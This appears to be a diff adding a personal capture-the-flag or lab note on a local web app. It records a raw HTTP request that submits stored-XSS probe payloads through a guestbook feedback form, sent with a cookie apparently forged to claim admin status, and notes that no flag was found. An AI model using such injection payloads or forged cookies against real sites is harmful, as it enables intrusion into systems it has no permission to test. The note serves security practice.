@@ -1,0 +1,22 @@
+http://192.168.122.55/?page=feedback
+xss stored
+request:
+
+POST /?page=feedback HTTP/1.1
+Host: 192.168.122.55
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 105
+Origin: http://192.168.122.55
+Connection: close
+Referer: http://192.168.122.55/?page=feedback
+Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
+Upgrade-Insecure-Requests: 1
+
+txtName=<body onload=alert(0)>&mtxtMessage=%3Cscript%3Ealert%280%29%3C%2Fscript%3E&btnSign=Sign+Guestbook
+
+
+no flag it's odd need more tests
